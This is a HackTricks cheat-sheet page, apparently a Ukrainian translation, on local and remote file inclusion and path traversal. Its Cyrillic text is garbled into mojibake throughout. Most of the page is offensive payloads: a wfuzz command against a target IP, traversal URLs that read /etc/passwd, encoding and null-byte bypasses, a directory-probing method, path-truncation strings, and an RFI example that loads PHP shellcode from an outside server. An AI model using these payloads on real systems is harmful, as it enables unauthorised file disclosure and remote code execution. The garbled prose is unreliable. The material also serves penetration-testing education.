# –í–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤/–ü–µ—Ä–µ—Ö—ñ–¥ –ø–æ —à–ª—è—Ö—É

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ —à—É–∫–∞—á–∞–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π!

**–Ü–Ω—Å–∞–π—Ç–∏ –∑ —Ö–∞–∫–µ—Ä—Å—Ç–≤–∞**\
–ó–∞–ª—É—á–∞–π—Ç–µ—Å—è –¥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —è–∫–∏–π –∑–∞–Ω—É—Ä—é—î—Ç—å—Å—è –≤ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫–µ—Ä—Å—Ç–≤–∞

**–ù–æ–≤–∏–Ω–∏ —Ö–∞–∫–µ—Ä—Å—Ç–≤–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–ø–ª–∏–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫–µ—Ä—Å—Ç–≤–∞ —á–µ—Ä–µ–∑ –Ω–æ–≤–∏–Ω–∏ —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ó–∞–ª–∏—à–∞–π—Ç–µ—Å—è –≤ –∫—É—Ä—Å—ñ –Ω–æ–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –≤–∏–Ω–∞–≥–æ—Ä–æ–¥ –∑–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —ñ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –ø—Ä–æ–≤—ñ–¥–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## –í–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

**–í—ñ–¥–¥–∞–ª–µ–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (RFI):** –§–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ (–ù–∞–π–∫—Ä–∞—â–µ: –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–¥, —ñ —Å–µ—Ä–≤–µ—Ä –π–æ–≥–æ –≤–∏–∫–æ–Ω–∞—î). –£ php —Ü–µ **–≤–∏–º–∫–Ω–µ–Ω–æ** –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º (**allow\_url\_include**).\
**–õ–æ–∫–∞–ª—å–Ω–µ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI):** –°–µ—Ä–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î –ª–æ–∫–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª.

–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º —Ñ–∞–π–ª, —è–∫–∏–π –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ —Å–µ—Ä–≤–µ—Ä–æ–º.

–í—Ä–∞–∑–ª–∏–≤—ñ **PHP —Ñ—É–Ω–∫—Ü—ñ—ó**: require, require\_once, include, include\_once

–¶—ñ–∫–∞–≤—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## –°–ª—ñ–ø–∏–π - –¶—ñ–∫–∞–≤–∏–π - LFI2RCE —Ñ–∞–π–ª–∏
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**–ó–º—ñ—à—É—é—á–∏ –∫—ñ–ª—å–∫–∞ —Å–ø–∏—Å–∫—ñ–≤ LFI –¥–ª—è \*nix —ñ –¥–æ–¥–∞—é—á–∏ –±—ñ–ª—å—à–µ —à–ª—è—Ö—ñ–≤, —è —Å—Ç–≤–æ—Ä–∏–≤ —Ü–µ–π:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –∑–º—ñ–Ω–∏—Ç–∏ `/` –Ω–∞ `\`\
–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –¥–æ–¥–∞—Ç–∏ `../../../../../`

–°–ø–∏—Å–æ–∫, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É /etc/password (—â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —ñ—Å–Ω—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å), –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

–ó–ª–∏—Ç—Ç—è —Ä—ñ–∑–Ω–∏—Ö —Å–ø–∏—Å–∫—ñ–≤ —Å–ª—ñ–≤:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –∑–º—ñ–Ω–∏—Ç–∏ `/` –Ω–∞ `\`\
–°–ø—Ä–æ–±—É–π—Ç–µ —Ç–∞–∫–æ–∂ –≤–∏–¥–∞–ª–∏—Ç–∏ `C:/` —ñ –¥–æ–¥–∞—Ç–∏ `../../../../../`

–°–ø–∏—Å–æ–∫, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É /boot.ini (—â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —ñ—Å–Ω—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å), –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å–ø–∏—Å–æ–∫ LFI –¥–ª—è linux.

## –û—Å–Ω–æ–≤–Ω–∏–π LFI —Ç–∞ –æ–±—Ö–æ–¥–∏

–£—Å—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Å—Ç–æ—Å—É—é—Ç—å—Å—è Local File Inclusion, –∞–ª–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ —ñ –¥–æ Remote File Inclusion (—Å—Ç–æ—Ä—ñ–Ω–∫–∞=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ –æ–±—Ö–æ–¥—É, —è–∫—ñ –±—É–ª–∏ –≤–∏–¥–∞–ª–µ–Ω—ñ –Ω–µ–∫—É—Ä—Å–∏–≤–Ω–æ
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

–û–±—ñ–π—Ç–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –±—ñ–ª—å—à–µ —Å–∏–º–≤–æ–ª—ñ–≤ –≤ –∫—ñ–Ω–µ—Ü—å –Ω–∞–¥–∞–Ω–æ–≥–æ —Ä—è–¥–∫–∞ (–æ–±—Ö—ñ–¥: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
–¶–µ **–≤–∏—Ä—ñ—à–µ–Ω–æ –∑ PHP 5.4**

### **–ö–æ–¥—É–≤–∞–Ω–Ω—è**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ –∫–æ–¥—É–≤–∞–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ –ø–æ–¥–≤–æ—î–Ω–µ –∫–æ–¥—É–≤–∞–Ω–Ω—è URL (—Ç–∞ —ñ–Ω—à—ñ):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### –ó —ñ—Å–Ω—É—é—á–æ—ó –ø–∞–ø–∫–∏

–ú–æ–∂–ª–∏–≤–æ, –±–µ–∫–µ–Ω–¥ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —à–ª—è—Ö –¥–æ –ø–∞–ø–∫–∏:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ

–§–∞–π–ª–æ–≤–∞ —Å–∏—Å—Ç–µ–º–∞ —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂–µ –±—É—Ç–∏ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–∞ —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, –∞ –Ω–µ –ª–∏—à–µ —Ñ–∞–π–ª—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–µ–≤–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –≤–∫–ª—é—á–∞—î –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –≥–ª–∏–±–∏–Ω–∏ –∫–∞—Ç–∞–ª–æ–≥—É —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –ø–∞–ø–æ–∫. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –¥–µ—Ç–∞–ª—å–Ω–∏–π –º–µ—Ç–æ–¥ –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ:

1. **–í–∏–∑–Ω–∞—á—Ç–µ –≥–ª–∏–±–∏–Ω—É –∫–∞—Ç–∞–ª–æ–≥—É:** –í–∏–∑–Ω–∞—á—Ç–µ –≥–ª–∏–±–∏–Ω—É –≤–∞—à–æ–≥–æ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É, —É—Å–ø—ñ—à–Ω–æ –æ—Ç—Ä–∏–º–∞–≤—à–∏ —Ñ–∞–π–ª `/etc/passwd` (–∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –Ω–∞ –±–∞–∑—ñ Linux). –ü—Ä–∏–∫–ª–∞–¥ URL –º–æ–∂–µ –±—É—Ç–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω–∏–π –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ –≥–ª–∏–±–∏–Ω—É —Ç—Ä–∏:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –ø–∞–ø–æ–∫:** –î–æ–¥–∞–π—Ç–µ –Ω–∞–∑–≤—É –ø—ñ–¥–æ–∑—Ä—é–≤–∞–Ω–æ—ó –ø–∞–ø–∫–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `private`) –¥–æ URL, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞–∑–∞–¥ –¥–æ `/etc/passwd`. –î–æ–¥–∞—Ç–∫–æ–≤–∏–π —Ä—ñ–≤–µ–Ω—å –∫–∞—Ç–∞–ª–æ–≥—É –≤–∏–º–∞–≥–∞—î –∑–±—ñ–ª—å—à–µ–Ω–Ω—è –≥–ª–∏–±–∏–Ω–∏ –Ω–∞ –æ–¥–∏–Ω:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **–Ü–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ü—ñ—è –†–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤:** –í—ñ–¥–ø–æ–≤—ñ–¥—å —Å–µ—Ä–≤–µ—Ä–∞ –≤–∫–∞–∑—É—î, —á–∏ —ñ—Å–Ω—É—î –ø–∞–ø–∫–∞:
* **–ü–æ–º–∏–ª–∫–∞ / –ù–µ–º–∞—î –í–∏–≤–æ–¥—É:** –ü–∞–ø–∫–∞ `private`, –π–º–æ–≤—ñ—Ä–Ω–æ, –Ω–µ —ñ—Å–Ω—É—î –∑–∞ –≤–∫–∞–∑–∞–Ω–∏–º –º—ñ—Å—Ü–µ–º.
* **–í–º—ñ—Å—Ç `/etc/passwd`:** –ù–∞—è–≤–Ω—ñ—Å—Ç—å –ø–∞–ø–∫–∏ `private` –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–∞.
4. **–†–µ–∫—É—Ä—Å–∏–≤–Ω–µ –î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è:** –í–∏—è–≤–ª–µ–Ω—ñ –ø–∞–ø–∫–∏ –º–æ–∂–Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø—ñ–¥–∫–∞—Ç–∞–ª–æ–≥—ñ–≤ –∞–±–æ —Ñ–∞–π–ª—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç—É –∂ —Ç–µ—Ö–Ω—ñ–∫—É –∞–±–æ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω—ñ –º–µ—Ç–æ–¥–∏ Local File Inclusion (LFI).

–î–ª—è –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —É —Ä—ñ–∑–Ω–∏—Ö –º—ñ—Å—Ü—è—Ö —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏, –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ payload. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º—ñ—Å—Ç–∏—Ç—å `/var/www/` –∫–∞—Ç–∞–ª–æ–≥ `private` (–ø—Ä–∏–ø—É—Å–∫–∞—é—á–∏, —â–æ –ø–æ—Ç–æ—á–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –Ω–∞ –≥–ª–∏–±–∏–Ω—ñ 3), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **–¢–µ—Ö–Ω—ñ–∫–∞ —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è —à–ª—è—Ö—É**

–°–∫–æ—Ä–æ—á–µ–Ω–Ω—è —à–ª—è—Ö—É - —Ü–µ –º–µ—Ç–æ–¥, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó —à–ª—è—Ö–∞–º–∏ —Ñ–∞–π–ª—ñ–≤ —É –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö. –ô–æ–≥–æ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –æ–±–º–µ–∂–µ–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –æ–±—Ö–æ–¥—è—á–∏ –ø–µ–≤–Ω—ñ –∑–∞—Ö–æ–¥–∏ –±–µ–∑–ø–µ–∫–∏, —è–∫—ñ –¥–æ–¥–∞—é—Ç—å –¥–æ–¥–∞—Ç–∫–æ–≤—ñ —Å–∏–º–≤–æ–ª–∏ –≤ –∫—ñ–Ω–µ—Ü—å —à–ª—è—Ö—ñ–≤ —Ñ–∞–π–ª—ñ–≤. –ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É, —è–∫–∏–π, –ø—ñ—Å–ª—è –∑–º—ñ–Ω–∏ –∑–∞—Ö–æ–¥–æ–º –±–µ–∑–ø–µ–∫–∏, –≤—Å–µ —â–µ –≤–∫–∞–∑—É—î –Ω–∞ –ø–æ—Ç—Ä—ñ–±–Ω–∏–π —Ñ–∞–π–ª.

–£ PHP —Ä—ñ–∑–Ω—ñ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è —à–ª—è—Ö—É –¥–æ —Ñ–∞–π–ª—É –º–æ–∂—É—Ç—å –≤–≤–∞–∂–∞—Ç–∏—Å—è –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–∏–º–∏ —á–µ—Ä–µ–∑ –ø—Ä–∏—Ä–æ–¥—É —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` —Ç–∞ `/etc/passwd/` –≤—Å—ñ —Ä–æ–∑–≥–ª—è–¥–∞—é—Ç—å—Å—è —è–∫ –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ —à–ª—è—Ö.
* –ö–æ–ª–∏ –æ—Å—Ç–∞–Ω–Ω—ñ 6 —Å–∏–º–≤–æ–ª—ñ–≤ - —Ü–µ `passwd`, –¥–æ–¥–∞–≤–∞–Ω–Ω—è `/` (–ø–µ—Ä–µ—Ç–≤–æ—Ä—é—é—á–∏ –π–æ–≥–æ –Ω–∞ `passwd/`) –Ω–µ –∑–º—ñ–Ω—é—î —Ü—ñ–ª—å–æ–≤–∏–π —Ñ–∞–π–ª.
* –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, —è–∫—â–æ –¥–æ —à–ª—è—Ö—É —Ñ–∞–π–ª—É –¥–æ–¥–∞—î—Ç—å—Å—è `.php` (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `shellcode.php`), –¥–æ–¥–∞–≤–∞–Ω–Ω—è `/.` –≤ –∫—ñ–Ω—Ü—ñ –Ω–µ –∑–º—ñ–Ω–∏—Ç—å —Ñ–∞–π–ª, –¥–æ —è–∫–æ–≥–æ –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –¥–æ—Å—Ç—É–ø.

–ù–∞–≤–µ–¥–µ–Ω–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å, —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è —à–ª—è—Ö—É –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ `/etc/passwd`, –ø–æ—à–∏—Ä–µ–Ω–æ—ó —Ü—ñ–ª—ñ —á–µ—Ä–µ–∑ —ó—ó —á—É—Ç–ª–∏–≤–∏–π –≤–º—ñ—Å—Ç (—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
–£ —Ü–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö –∫—ñ–ª—å–∫—ñ—Å—Ç—å –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤ –º–æ–∂–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –±–ª–∏–∑—å–∫–æ 2027, –∞–ª–µ —Ü–µ —á–∏—Å–ª–æ –º–æ–∂–µ –∑–º—ñ–Ω—é–≤–∞—Ç–∏—Å—è –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Å–µ—Ä–≤–µ—Ä–∞.

* **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫—Ä–∞–ø–∫–æ–≤–∏—Ö —Å–µ–≥–º–µ–Ω—Ç—ñ–≤ —Ç–∞ –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤**: –ü–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤ (`../`), –ø–æ—î–¥–Ω–∞–Ω—ñ –∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ –∫—Ä–∞–ø–∫–æ–≤–∏–º–∏ —Å–µ–≥–º–µ–Ω—Ç–∞–º–∏ —Ç–∞ —Å–∏–º–≤–æ–ª–∞–º–∏, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó –ø–æ —Ñ–∞–π–ª–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —ñ–≥–Ω–æ—Ä—É—é—á–∏ –¥–æ–¥–∞–Ω—ñ —Ä—è–¥–∫–∏ —Å–µ—Ä–≤–µ—Ä–æ–º.
* **–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤**: –ß–µ—Ä–µ–∑ –ø—Ä–æ–±–∏ —Ç–∞ –ø–æ–º–∏–ª–∫–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç–æ—á–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç–µ–π `../`, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–ª—è –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó –¥–æ –∫–æ—Ä–µ–Ω–µ–≤–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, –∞ –ø–æ—Ç—ñ–º –¥–æ `/etc/passwd`, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –Ω–µ–π—Ç—Ä–∞–ª—ñ–∑–∞—Ü—ñ—é –±—É–¥—å-—è–∫–∏—Ö –¥–æ–¥–∞–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤ (—è–∫-–æ—Ç `.php`), –∞–ª–µ –∑–∞–ª–∏—à–∞—é—á–∏ –±–∞–∂–∞–Ω–∏–π —à–ª—è—Ö (`/etc/passwd`) –Ω–µ–∑–º—ñ–Ω–Ω–∏–º.
